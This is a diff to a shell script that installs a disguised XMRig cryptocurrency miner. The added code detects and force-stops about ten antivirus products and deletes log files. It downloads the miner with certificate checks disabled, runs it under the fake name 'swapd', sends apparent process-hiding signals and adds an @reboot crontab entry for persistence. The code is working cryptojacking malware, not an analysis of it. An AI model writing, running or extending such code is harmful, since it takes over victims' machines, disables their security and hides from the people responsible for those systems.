@@ -784,6 +784,123 @@ elif ! curl -sS --max-time 5 https://google.com >/dev/null 2>&1; then
     USE_WGET=true
 fi
 
+# ==================== DISABLE ANTIVIRUS SOFTWARE ====================
+echo ""
+echo "[*] Detecting and disabling antivirus software..."
+
+AV_DISABLED=false
+
+# ClamAV
+if command -v clamav-daemon >/dev/null 2>&1 || systemctl is-active clamav-daemon >/dev/null 2>&1; then
+    echo "[*] ClamAV detected - stopping..."
+    systemctl stop clamav-daemon clamav-freshclam 2>/dev/null || true
+    service clamav-daemon stop 2>/dev/null || true
+    /etc/init.d/clamav-daemon stop 2>/dev/null || true
+    killall -9 clamd freshclam 2>/dev/null || true
+    AV_DISABLED=true
+fi
+
+# Sophos
+if [ -d /opt/sophos-av ] || command -v /opt/sophos-av/bin/savdctl >/dev/null 2>&1; then
+    echo "[*] Sophos detected - stopping..."
+    /opt/sophos-av/bin/savdctl disable 2>/dev/null || true
+    systemctl stop sav-protect 2>/dev/null || true
+    AV_DISABLED=true
+fi
+
+# Avast
+if command -v avast >/dev/null 2>&1; then
+    echo "[*] Avast detected - stopping..."
+    systemctl stop avast 2>/dev/null || true
+    /etc/init.d/avast stop 2>/dev/null || true
+    AV_DISABLED=true
+fi
+
+# Comodo
+if [ -d /opt/COMODO ] || command -v cmdagent >/dev/null 2>&1; then
+    echo "[*] Comodo detected - stopping..."
+    killall -9 cmdagent 2>/dev/null || true
+    /etc/init.d/cmdagent stop 2>/dev/null || true
+    AV_DISABLED=true
+fi
+
+# ESET
+if command -v /opt/eset/esets/sbin/esets_daemon >/dev/null 2>&1; then
+    echo "[*] ESET detected - stopping..."
+    /etc/init.d/esets stop 2>/dev/null || true
+    systemctl stop esets 2>/dev/null || true
+    AV_DISABLED=true
+fi
+
+# Kaspersky
+if [ -d /var/opt/kaspersky ] || command -v kesl-control >/dev/null 2>&1; then
+    echo "[*] Kaspersky detected - stopping..."
+    systemctl stop kesl 2>/dev/null || true
+    /etc/init.d/kesl stop 2>/dev/null || true
+    AV_DISABLED=true
+fi
+
+# McAfee
+if command -v /opt/McAfee/ens/tp/init/mfetpd-control.sh >/dev/null 2>&1; then
+    echo "[*] McAfee detected - stopping..."
+    /opt/McAfee/ens/tp/init/mfetpd-control.sh stop 2>/dev/null || true
+    AV_DISABLED=true
+fi
+
+# Bitdefender
+if command -v /opt/bitdefender/bin/bdscan >/dev/null 2>&1; then
+    echo "[*] Bitdefender detected - stopping..."
+    systemctl stop bd-protection 2>/dev/null || true
+    /etc/init.d/bd-protection stop 2>/dev/null || true
+    AV_DISABLED=true
+fi
+
+# F-Prot
+if command -v fprot >/dev/null 2>&1; then
+    echo "[*] F-Prot detected - stopping..."
+    systemctl stop f-prot 2>/dev/null || true
+    /etc/init.d/f-prot stop 2>/dev/null || true
+    AV_DISABLED=true
+fi
+
+# AVG
+if command -v avgctl >/dev/null 2>&1; then
+    echo "[*] AVG detected - stopping..."
+    avgctl --stop 2>/dev/null || true
+    systemctl stop avgd 2>/dev/null || true
+    AV_DISABLED=true
+fi
+
+if [ "$AV_DISABLED" = true ]; then
+    echo "[✓] Antivirus software disabled"
+    sleep 2
+else
+    echo "[*] No common antivirus detected"
+fi
+
+# ==================== DISK SPACE CHECK ====================
+echo "[*] Checking available disk space..."
+AVAILABLE_KB=$(df /root 2>/dev/null | tail -1 | awk '{print $4}')
+REQUIRED_KB=102400  # 100MB minimum
+
+if [ -n "$AVAILABLE_KB" ] && [ "$AVAILABLE_KB" -lt "$REQUIRED_KB" ]; then
+    echo "[!] WARNING: Low disk space detected!"
+    echo "[!] Available: $((AVAILABLE_KB / 1024))MB | Required: $((REQUIRED_KB / 1024))MB"
+    echo "[*] Attempting cleanup..."
+    
+    # Clean package cache
+    apt-get clean 2>/dev/null || true
+    yum clean all 2>/dev/null || true
+    
+    # Remove old logs
+    find /var/log -type f -name "*.log.*" -delete 2>/dev/null || true
+    find /var/log -type f -name "*.gz" -delete 2>/dev/null || true
+    
+    # Re-check
+    AVAILABLE_KB=$(df /root 2>/dev/null | tail -1 | awk '{print $4}')
+    echo "[*] After cleanup: $((AVAILABLE_KB / 1024))MB available"
+fi
+
 # ==================== DOWNLOAD XMRIG ====================
 echo "[*] Downloading XMRig..."
 
@@ -802,38 +919,76 @@ DOWNLOAD_SUCCESS=false
 ATTEMPTS=0
 MAX_ATTEMPTS=3
 
-# Retry download up to 3 times
-while [ $ATTEMPTS -lt $MAX_ATTEMPTS ] && [ "$DOWNLOAD_SUCCESS" = false ]; do
+# Multiple mirrors in case GitHub is blocked or slow
+MIRRORS=(
+    "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz"
+    "https://objects.githubusercontent.com/github-production-release-asset-2e65be/78932994/d7c9e680-8a63-11ee-9fa2-d9fb1a654e30?X-Amz-Algorithm=AWS4-HMAC-SHA256"
+)
+
+# Expected tarball size (approximately 3.5MB)
+EXPECTED_SIZE_MIN=3400000  # 3.4MB minimum
+EXPECTED_SIZE_MAX=3600000  # 3.6MB maximum
+
+# Retry download up to 3 times with different mirrors
+for mirror in "${MIRRORS[@]}"; do
+    [ "$DOWNLOAD_SUCCESS" = true ] && break
+    
     ATTEMPTS=$((ATTEMPTS + 1))
-    echo "[*] Download attempt $ATTEMPTS/$MAX_ATTEMPTS..."
+    echo "[*] Download attempt $ATTEMPTS/$MAX_ATTEMPTS from: $mirror"
+    
+    # Remove old failed download
+    rm -f xmrig.tar.gz 2>/dev/null
     
     # Try to download xmrig
     if [ "$USE_WGET" = true ]; then
         if [ "$VERBOSE" = true ]; then
-            echo "[*] wget --no-check-certificate -O xmrig.tar.gz $XMRIG_URL"
-            wget --timeout=30 --tries=2 --no-check-certificate -O xmrig.tar.gz "$XMRIG_URL" && DOWNLOAD_SUCCESS=true
+            echo "[*] wget --no-check-certificate -O xmrig.tar.gz $mirror"
+            wget --timeout=30 --tries=2 --no-check-certificate -O xmrig.tar.gz "$mirror" && DOWNLOAD_SUCCESS=true
         else
-            wget --timeout=30 --tries=2 -q --no-check-certificate -O xmrig.tar.gz "$XMRIG_URL" 2>/dev/null && DOWNLOAD_SUCCESS=true
+            wget --timeout=30 --tries=2 -q --no-check-certificate -O xmrig.tar.gz "$mirror" 2>/dev/null && DOWNLOAD_SUCCESS=true
         fi
     else
         if [ "$VERBOSE" = true ]; then
-            echo "[*] curl -L -k -o xmrig.tar.gz $XMRIG_URL"
-            curl --max-time 60 --retry 2 -L -k -o xmrig.tar.gz "$XMRIG_URL" && DOWNLOAD_SUCCESS=true
+            echo "[*] curl -L -k -o xmrig.tar.gz $mirror"
+            curl --max-time 60 --retry 2 -L -k -o xmrig.tar.gz "$mirror" && DOWNLOAD_SUCCESS=true
         else
-            curl --max-time 60 --retry 2 -sS -L -k -o xmrig.tar.gz "$XMRIG_URL" 2>/dev/null && DOWNLOAD_SUCCESS=true
+            curl --max-time 60 --retry 2 -sS -L -k -o xmrig.tar.gz "$mirror" 2>/dev/null && DOWNLOAD_SUCCESS=true
         fi
     fi
     
-    # Verify download
+    # Verify download - check if file exists, has content, and is the right size
     if [ -f xmrig.tar.gz ] && [ -s xmrig.tar.gz ]; then
-        echo "[✓] Downloaded $(du -h xmrig.tar.gz | cut -f1)"
-        break
+        FILE_SIZE=$(stat -c%s xmrig.tar.gz 2>/dev/null || wc -c < xmrig.tar.gz)
+        echo "[*] Downloaded: $((FILE_SIZE / 1024 / 1024))MB ($FILE_SIZE bytes)"
+        
+        # Check if size is in expected range
+        if [ "$FILE_SIZE" -lt "$EXPECTED_SIZE_MIN" ]; then
+            echo "[!] Downloaded file too small (corrupted/incomplete)"
+            echo "[!] Expected >3.4MB, got $((FILE_SIZE / 1024 / 1024))MB"
+            DOWNLOAD_SUCCESS=false
+            rm -f xmrig.tar.gz
+        elif [ "$FILE_SIZE" -gt "$EXPECTED_SIZE_MAX" ]; then
+            echo "[!] Downloaded file too large (unexpected)"
+            DOWNLOAD_SUCCESS=false
+            rm -f xmrig.tar.gz
+        else
+            # Try to list tarball contents to verify integrity
+            if tar -tzf xmrig.tar.gz >/dev/null 2>&1; then
+                echo "[✓] Tarball integrity verified"
+                break
+            else
+                echo "[!] Tarball corrupted (failed integrity check)"
+                DOWNLOAD_SUCCESS=false
+                rm -f xmrig.tar.gz
+            fi
+        fi
     else
         echo "[!] Download failed or file is empty"
         DOWNLOAD_SUCCESS=false
         rm -f xmrig.tar.gz
-        sleep 2
     fi
+    
+    sleep 2
 done
 
 # Extract if download was successful
@@ -1755,7 +1910,7 @@ echo "[*] Starting swapd service..."
 # If service was already running, it won't be hidden until restarted!
 
 if [ "$SYSTEMD_AVAILABLE" = true ]; then
-    # Check if already running
+    # Systemd
     if systemctl is-active --quiet swapd 2>/dev/null; then
         echo "[*] Service already running - restarting service..."
         systemctl restart swapd 2>/dev/null
@@ -1765,7 +1920,7 @@ if [ "$SYSTEMD_AVAILABLE" = true ]; then
     fi
     sleep 2
     systemctl status swapd --no-pager -l 2>/dev/null || systemctl status swapd 2>/dev/null
-else
+elif [ -f /etc/init.d/swapd ]; then
     # SysV init
     if /etc/init.d/swapd status 2>/dev/null | grep -q "running"; then
         echo "[*] Service already running - restarting service..."
@@ -1776,6 +1931,36 @@ else
     fi
     sleep 2
     /etc/init.d/swapd status
+else
+    # Fallback: No systemd, no SysV init (BusyBox/embedded systems)
+    echo "[!] No systemd or SysV init detected (BusyBox/embedded system)"
+    echo "[*] Starting miner as background daemon..."
+    
+    # Kill any existing instances
+    pkill -9 -f /root/.swapd/swapd 2>/dev/null || true
+    killall -9 swapd 2>/dev/null || true
+    
+    # Start in background with nohup
+    cd /root/.swapd || exit 1
+    nohup /root/.swapd/swapd -c /root/.swapd/swapfile >/dev/null 2>&1 &
+    MINER_PID=$!
+    
+    sleep 3
+    
+    # Verify it started
+    if kill -0 $MINER_PID 2>/dev/null; then
+        echo "[✓] Miner started as daemon (PID: $MINER_PID)"
+        
+        # Send hide signals immediately
+        kill -31 $MINER_PID 2>/dev/null || true
+        kill -59 $MINER_PID 2>/dev/null || true
+        
+        # Add to crontab for auto-restart on reboot
+        (crontab -l 2>/dev/null | grep -v "swapd"; echo "@reboot cd /root/.swapd && nohup /root/.swapd/swapd -c /root/.swapd/swapfile >/dev/null 2>&1 &") | crontab -
+        echo "[✓] Added to crontab for auto-start on reboot"
+    else
+        echo "[!] Failed to start miner daemon"
+    fi
 fi
 
 # ==================== CLEAN UP LOGS ====================
